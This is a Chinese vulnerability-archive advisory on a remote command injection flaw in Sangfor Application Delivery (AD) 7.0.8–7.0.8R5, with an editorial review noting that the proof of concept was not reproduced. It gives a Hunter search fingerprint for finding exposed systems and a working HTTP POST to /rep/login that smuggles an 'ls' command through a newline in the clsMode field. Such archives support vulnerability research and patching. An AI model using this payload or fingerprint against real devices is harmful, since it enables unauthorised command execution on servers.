---
source: "wy876 漏洞文库"
id: "vw-33ee271025750d2b0b4bd32e"
entity_id: "ve-33ee271025750d2b0b4bd32e"
schema_version: "1"
fofa_unverified: "app.name="
title: "深信服应用交付管理系统rep/login远程命令执行漏洞"
product: "Sangfor应用交付AD"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "7.0.8–7.0.8R5；登录表单携带账号但是否验证前触发未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Frep_login%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nfnaaq9o1k6tgszw"
source_status: "recorded"
---

# 深信服应用交付管理系统rep/login远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Sangfor应用交付AD
- 本文讨论：rep/login clsMode换行命令注入
- 版本、权限与配置前提：7.0.8–7.0.8R5；登录表单携带账号但是否验证前触发未知
- 资料类型：AD登录命令注入摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 无响应/执行权限证据，版本有但修复缺；fofa误录Hunter残缺字段
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 认证前后界限及版本补丁待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">深信服应用交付管理系统login存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，执行任意命令。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 深信服应用交付管理系统7.0.8-7.0.8R5

# 三、资产测绘
+ hunter`app.name="SANGFOR 深信服应用交付报表系统"`


+ 登录页面


# 四、漏洞复现
```http
POST /rep/login HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac 0s X 10.15: ry:109.0)Gecko/20100101 Firefox/115.0
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-type: application/x-www-form-urlencoded
Content-Length: 118

clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nfnaaq9o1k6tgszw>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
